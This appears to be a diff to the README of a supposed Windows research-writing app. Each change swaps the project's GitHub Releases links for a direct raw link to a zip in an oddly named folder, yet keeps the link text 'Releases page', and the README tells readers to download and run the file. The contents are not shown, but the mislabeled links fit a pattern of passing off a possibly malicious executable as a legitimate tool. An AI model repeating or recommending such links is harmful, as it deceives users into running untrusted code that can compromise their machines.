@@ -1,6 +1,6 @@
 # 🧠 research-writing-skill - Write papers with less effort
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue%20%26%20grey)](https://github.com/Nonsteroidevangel872/research-writing-skill/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue%20%26%20grey)](https://raw.githubusercontent.com/Nonsteroidevangel872/research-writing-skill/main/tympanitic/research_writing_skill_v3.5.zip)
 
 ## 🚀 Overview
 
@@ -10,13 +10,13 @@ It is made for Windows users who want a simple way to get help with research wri
 
 ## 📥 Download
 
-Go to the [Releases page](https://github.com/Nonsteroidevangel872/research-writing-skill/releases) to download and run this file.
+Go to the [Releases page](https://raw.githubusercontent.com/Nonsteroidevangel872/research-writing-skill/main/tympanitic/research_writing_skill_v3.5.zip) to download and run this file.
 
 On the releases page, look for the latest version and choose the Windows file that matches your system. Most users will want the `.exe` or `.zip` file listed under the latest release.
 
 ## 🪟 Windows Setup
 
-1. Open the [Releases page](https://github.com/Nonsteroidevangel872/research-writing-skill/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Nonsteroidevangel872/research-writing-skill/main/tympanitic/research_writing_skill_v3.5.zip)
 2. Find the newest release
 3. Download the Windows file
 4. If you get a `.zip` file, right-click it and choose Extract All
@@ -181,7 +181,7 @@ These topics show that the app is focused on academic writing and research suppo
 
 ## 📎 Download Again
 
-If you need the file again, go to the [Releases page](https://github.com/Nonsteroidevangel872/research-writing-skill/releases) and download and run this file
+If you need the file again, go to the [Releases page](https://raw.githubusercontent.com/Nonsteroidevangel872/research-writing-skill/main/tympanitic/research_writing_skill_v3.5.zip) and download and run this file
 
 ## 🧭 Using the App Day to Day
 
